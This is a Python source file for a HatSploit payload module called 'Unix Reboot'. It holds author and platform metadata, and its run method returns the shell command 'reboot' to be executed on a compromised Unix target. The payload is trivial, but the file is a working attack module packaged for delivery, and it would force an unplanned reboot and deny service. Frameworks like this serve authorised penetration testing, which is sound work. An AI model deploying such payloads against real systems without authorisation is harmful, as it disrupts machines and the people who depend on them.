"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.payload import Payload


class HatSploitPayload(Payload):
    def __init__(self):
        super().__init__()

        self.details = {
            'Name': "Unix Reboot",
            'Payload': "unix/generic/reboot",
            'Authors': [
                'Ivan Nikolsky (enty8080) - payload developer',
            ],
            'Description': "Reboot payload for unix.",
            'Architecture': "generic",
            'Platform': "unix",
            'Rank': "low",
            'Type': "one_side",
        }

    def run(self):
        payload = "reboot"

        return payload
